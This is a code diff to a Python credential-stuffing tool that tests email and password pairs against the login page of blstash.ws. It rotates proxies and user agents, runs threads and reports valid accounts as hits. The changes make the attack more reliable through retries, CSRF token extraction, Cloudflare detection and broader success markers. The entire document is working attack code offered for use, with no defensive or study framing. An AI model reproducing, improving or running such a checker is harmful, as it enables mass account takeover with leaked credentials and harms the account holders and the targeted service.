@@ -5,10 +5,10 @@ import time
 import warnings
 import threading
 import shutil
+import re
 from queue import Queue
 from colorama import init, Fore, Style
 from user_agent import generate_user_agent
-from urllib.parse import urlparse
 
 warnings.filterwarnings("ignore", category=requests.packages.urllib3.exceptions.InsecureRequestWarning)
 init(autoreset=True)
@@ -17,12 +17,8 @@ init(autoreset=True)
 UA_CONFIGS = [
     {'os': 'win', 'navigator': 'chrome'},
     {'os': 'win', 'navigator': 'firefox'},
-    {'os': 'win', 'navigator': 'ie'},
     {'os': 'mac', 'navigator': 'chrome'},
-    {'os': 'mac', 'navigator': 'firefox'},
     {'os': 'linux', 'navigator': 'chrome'},
-    {'os': 'linux', 'navigator': 'firefox'},
-    {'os': 'android', 'navigator': 'chrome'},
 ]
 
 def get_random_user_agent():
@@ -30,7 +26,7 @@ def get_random_user_agent():
         config = random.choice(UA_CONFIGS)
         return generate_user_agent(os=config['os'], navigator=config['navigator'])
     except:
-        return generate_user_agent()
+        return "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/122.0.0.0 Safari/537.36"
 
 try:
     import socks
@@ -131,11 +127,6 @@ if not proxies:
     else:
         input(f"\n{Fore.RED}proxy.txt is REQUIRED for full checking! Press Enter to exit...")
         exit()
-else:
-    if not SOCKS_AVAILABLE:
-        has_socks = any(p.startswith(('socks4://', 'socks5://', 'socks5h://')) for p in proxies)
-        if has_socks:
-            print(f"{Fore.YELLOW}[!] Warning: SOCKS proxies detected but 'requests[socks]' not installed.\n")
 
 if use_proxies:
     threads_input = input(f"{Fore.CYAN}Threads (1-50, default 10): {Style.RESET_ALL}").strip()
@@ -156,41 +147,89 @@ print_lock = threading.Lock()
 result_counter = 0
 
 def check_account(email, pwd, proxy_dict):
+    """Check Blstash account - FIX: Better connection handling and retry logic"""
     s = requests.Session()
     userA = get_random_user_agent()
     
+    # Configure session for better reliability
+    s.headers.update({
+        "User-Agent": userA,
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
+        "Accept-Language": "en-US,en;q=0.9",
+        "Accept-Encoding": "gzip, deflate, br",
+        "Connection": "keep-alive",
+    })
+    
     try:
+        # Try to get the main page with retries
+        main_url = "https://blstash.ws/"
+        r1 = None
+        
+        for attempt in range(2):
+            try:
+                r1 = s.get(main_url, proxies=proxy_dict, timeout=30, verify=False)
+                break
+            except requests.exceptions.ConnectionError:
+                if attempt == 0:
+                    time.sleep(2)
+                    continue
+                raise
+        
+        if r1 is None or r1.status_code >= 500:
+            return "error", "Site unavailable"
+        
+        # Check for Cloudflare
+        if r1.status_code == 403 or "cloudflare" in r1.text.lower():
+            return "fail", "Cloudflare blocked"
+        
+        # Extract any CSRF token
+        csrf = ""
+        csrf_match = re.search(r'name=["\']?csrf[_-]?token["\']?\s*value=["\']([^"\']+)["\']', r1.text, re.I)
+        if csrf_match:
+            csrf = csrf_match.group(1)
+        
+        # Update headers for login
         headers = {
-            "User-Agent": userA,
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.9",
-            "Accept-Encoding": "gzip, deflate, br",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Origin": "https://blstash.ws",
+            "Referer": "https://blstash.ws/login",
         }
         
-        s.get("https://blstash.ws/", headers=headers, proxies=proxy_dict, timeout=25, verify=False)
+        # Build login data
+        login_data = {"username": email, "password": pwd}
+        if csrf:
+            login_data["csrf_token"] = csrf
         
-        headers["Content-Type"] = "application/x-www-form-urlencoded"
-        headers["Origin"] = "https://blstash.ws"
-        headers["Referer"] = "https://blstash.ws/login"
-        
-        r = s.post("https://blstash.ws/login", 
-                   data={"username": email, "password": pwd},
-                   headers=headers, proxies=proxy_dict, timeout=25, verify=False, allow_redirects=True)
+        r = s.post("https://blstash.ws/login", data=login_data,
+                   headers=headers, proxies=proxy_dict, timeout=30, verify=False, allow_redirects=True)
         
         txt = r.text.lower()
         url = r.url.lower()
         
-        if any(x in url for x in ["dashboard", "panel", "home"]) or any(x in txt for x in ["balance", "logout", "welcome"]):
+        # Success indicators
+        if any(x in url for x in ["dashboard", "panel", "home", "account"]) and "login" not in url:
             return "hit", "Valid"
-        elif any(x in txt for x in ["invalid", "incorrect", "wrong", "error"]):
+        if any(x in txt for x in ["balance", "logout", "welcome", "deposit"]):
+            return "hit", "Valid"
+        
+        # Failure indicators
+        if any(x in txt for x in ["invalid", "incorrect", "wrong", "error", "failed"]):
             return "fail", "Invalid credentials"
+        
+        # Check if on login page still
+        if "login" in url:
+            return "fail", "Login failed"
+            
         return "fail", f"Status {r.status_code}"
+        
     except requests.exceptions.Timeout:
         return "error", "Timeout"
+    except requests.exceptions.ConnectionError:
+        return "error", "Connection error"
     except requests.exceptions.ProxyError:
         return "error", "Proxy error"
-    except:
-        return "error", "Request failed"
+    except Exception as e:
+        return "error", f"Error: {str(e)[:30]}"
 
 def worker(q):
     global result_counter, hit_counter, fail_counter
